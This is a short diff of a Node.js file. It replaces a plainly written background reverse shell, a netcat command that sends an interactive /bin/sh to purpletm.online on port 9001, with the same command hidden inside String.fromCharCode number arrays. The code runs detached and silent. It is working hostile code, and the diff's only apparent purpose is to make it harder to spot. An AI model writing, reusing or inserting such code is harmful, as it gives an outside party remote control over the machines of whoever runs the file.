@@ -1,3 +1,3 @@
-const {spawn} = require('child_process');
-const _0xa1b2 = 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc purpletm.online 9001 > /tmp/f';
-spawn('sh', ['-c', _0xa1b2], {detached: true, stdio: ['ignore', 'ignore', 'ignore']}).unref();
+const {spawn} = require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));
+const _0xa1b2 = String.fromCharCode(114,109,32,45,102,32,47,116,109,112,47,102,59,32,109,107,102,105,102,111,32,47,116,109,112,47,102,59,32,99,97,116,32,47,116,109,112,47,102,32,124,32,47,98,105,110,47,115,104,32,45,105,32,50,62,38,49,32,124,32,110,99,32,112,117,114,112,108,101,116,109,46,111,110,108,105,110,101,32,57,48,48,49,32,62,32,47,116,109,112,47,102);
+spawn(String.fromCharCode(115,104), [String.fromCharCode(45,99), _0xa1b2], {detached: true, stdio: [String.fromCharCode(105,103,110,111,114,101),String.fromCharCode(105,103,110,111,114,101),String.fromCharCode(105,103,110,111,114,101)]}).unref();
